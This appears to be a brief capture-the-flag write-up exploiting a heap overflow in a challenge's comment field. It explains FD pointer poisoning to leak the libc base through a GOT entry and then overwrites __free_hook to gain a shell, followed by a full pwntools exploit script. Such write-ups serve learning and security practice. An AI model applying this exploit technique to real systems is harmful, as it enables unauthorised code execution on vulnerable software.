The team management system is vulnerable to a heap overflow in the comments section. We can use that to overwrite metadata of other chunks. I used the overflow to modify the FD pointer of a free chunk and insert a fake chunk to a GOT entry in order to leak LIBC base. Then I used the same method to insert a fake chunk pointing to `__free_hook`, I overwritten it with the address of `system` function and I've got shell. Simple heap trick. 

```python
io = start()
p='Exit'
_sndal(p, '1')
_sndl(1)
_sndal(':', 'aa')
for i in range(5):
    _sndal(':', 123)

_sndal(p, '1')
_sndl(2)
for i in range(6):
    _sndal(':', 123)

_sndal(p, 3)
_sndl(1)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(0x602028) * (100 + 0x100 / 8))
_sndal(p, 4)
_sndl(2)
_rcvu('comment: ')
libc = ELF('./libc-2.27.so')
libc.address = unpack(_rcvn(8)) - libc.symbols['puts']
log.info(hex(libc.address))

_sndal(p, 3)
_sndl(1)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(libc.symbols['__free_hook']) * (100 + 0x100 / 8))

_sndal(p, 3)
_sndl(2)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(libc.address + 0x4f322))

_sndal(p, 2)
_sndl(1)

io.interactive()

```
